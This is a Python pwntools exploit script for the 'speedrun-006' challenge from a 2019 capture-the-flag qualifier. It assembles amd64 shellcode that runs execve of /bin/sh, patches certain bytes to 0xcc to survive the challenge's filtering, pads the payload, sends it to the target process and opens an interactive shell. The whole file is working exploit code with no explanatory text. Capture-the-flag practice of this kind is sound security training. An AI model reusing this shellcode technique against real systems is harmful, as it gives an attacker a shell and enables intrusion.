from pwn import *

#sock = remote("speedrun-006.quals2019.oooverflow.io", 31337)
sock = process("speedrun-006")

shellcode = asm("""
syscall
inc ebx
mov rsp, rcx
mov ebx, 0xffc4978c
neg ebx
mov bl, 0x73
push rbx
mov bl, 0xcc
mov al, 0x3b
push rsp
pop rdi
syscall
""", arch="amd64")

"""
0x7ffff7ff6000:	0x3148e43148ed3148	0x48c93148db3148c0
0x7ffff7ff6010:	0xff3148f63148d231	0x314dc9314dc0314d
0x7ffff7ff6020:	0x4de4314ddb314dd2	0xff314df6314ded31
0x7ffff7ff6030:	0x4242cc4241414141	0x4444434343cc4342
0x7ffff7ff6040:	0x464545cc45454444	0x0000cc4747474646
"""

shellcode = shellcode[:5] + b'\xcc' + shellcode[6:]
shellcode = shellcode[:10] + b'\xcc' + shellcode[11:]
shellcode = shellcode[:20] + b'\xcc' + shellcode[21:]

print(disasm(shellcode, arch='amd64'))

shellcode += 'A' * (0x1a - len(shellcode))
print(hex(len(shellcode)))
_ = raw_input()
sock.send(shellcode)

sock.interactive()
